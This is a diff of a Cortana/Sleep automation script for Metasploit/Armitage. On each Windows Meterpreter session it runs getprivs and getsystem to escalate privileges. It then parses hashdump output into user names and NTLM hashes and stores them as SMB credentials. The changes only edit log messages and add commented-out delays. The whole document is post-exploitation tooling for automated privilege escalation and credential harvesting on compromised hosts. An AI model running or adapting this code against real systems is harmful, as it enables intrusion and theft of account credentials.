@@ -3,7 +3,6 @@
 # Step 1. When a session opens, grab its routes.
 on session_sync {
 	if (-iswinmeterpreter $1) {
-		println("[*] Dumping Hashes on session: $1");
 		m_cmd($1, "getprivs");
 		m_cmd($1, "getsystem");
 		m_cmd($1, "getprivs");
@@ -22,9 +21,11 @@ on meterpreter_hashdump {
 		if ($entry ismatch '(.*?):\d+:(.*?):(.*?):.*') {
 			($user, $fhash, $lhash) = matched();
 			$hash = $fhash . ":" . $lhash;
+			#sleep(2 * 1000);
 			credential_add(session_host($1), 445, $user, $hash, "smb_hash");
+			#sleep(2 * 1000);
 			$temphoststore = session_host($1);
-			println("[*] Dumping $temphoststore : $user $hash into database!");
+			println("[*] Dumping $temphoststore session $1 : $user $hash into database!");
 			$count += 1;
 		}
 	}
